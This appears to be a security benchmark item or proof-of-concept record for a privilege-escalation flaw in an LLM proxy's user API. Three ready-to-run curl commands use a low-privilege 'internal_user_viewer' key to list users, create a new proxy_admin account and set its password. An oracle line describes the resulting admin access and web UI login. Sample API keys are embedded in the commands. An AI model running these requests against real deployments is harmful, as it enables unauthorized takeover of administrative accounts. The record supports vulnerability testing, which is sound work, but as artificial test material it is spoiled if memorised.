title: Incorrect privilege assignment allows internal_user_viewer to obtain admin API key
trigger_payload:
curl -X 'GET' \
'http://localhost:4000/user/list?page=1&page_size=25' \
-H 'accept: application/json' \
-H 'x-api-key: sk-hxuUnxEqXzSpaS1iw1MQpA'

curl -X 'POST' \
'http://localhost:4000/user/new' \
-H 'accept: application/json' \
-H 'x-api-key: sk-hxuUnxEqXzSpaS1iw1MQpA' \
-H 'Content-Type: application/json' \
-d '{\n"user_role":"proxy_admin",\n"user_email":"test2@example.com",\n"auto_create_key": true\n}'

curl -X 'POST' \
'http://localhost:4000/user/update' \
-H 'accept: application/json' \
-H 'x-api-key: sk-gxvnCjjbeA61Jy2Vc-mX_A' \
-H 'Content-Type: application/json' \
-d '{\n"user_id":"f90a48d3-6ab5-4eab-9fdd-648a9c358970",\n"password":"password"\n}'
oracle: Access to admin-only endpoints like /users/list and /users/get_users, creation of a new proxy_admin user, and ability to log in to the web UI with the newly created admin account
